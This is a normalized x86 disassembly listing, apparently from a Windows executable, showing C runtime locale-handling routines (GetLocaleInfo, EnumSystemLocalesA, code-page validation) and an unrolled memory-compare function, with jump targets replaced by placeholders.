push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_40c5c8
mov eax esi
jmp r-xdata
sub_40fcb0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_40fcf6
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_412e09
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_40fd58
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_40b000
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_40b000
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_412e50
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_40fddc
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_40fe01
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_40fe32
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_40fe4d
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_4072c1
mov edx edi
mov esi eax
call sub_40fe01
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_412e09
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_40fddc
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_407abb
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_40fef4
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_40fe32
push esi
mov edi eax
call sub_407a30
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_40ff4f
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_4072c1
mov edx edi
lea esi [ eax + 0x9c ]
call sub_40fe01
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_412e09
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_412e09
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_412e09
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_412f48
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_412e09
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_407a30
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_40fddc
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_407a30
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_40fef4
pop ecx
pop ecx
test eax eax
je r-xdata
sub_410120
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_4072c1
mov edx edi
lea esi [ eax + 0x9c ]
call sub_40fe01
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_412e09
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_407abb
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_412e09
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_40fef4
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_4101e0
push [ esi ]
call sub_407a30
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_407a30
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_40fe32
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_40ff4f
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_410247
push [ esi ]
call sub_407a30
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_40fe32
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_410120
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_410283
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_4072c1
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_40fcf6
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_40fd58
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_407a30
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_40fe4d
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_410247
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_40fcf6
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_4101e0
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_410247
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_4101e0
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_40ae37
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40c576
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_413055
add esp 0x10
sub_410474
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_411948 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
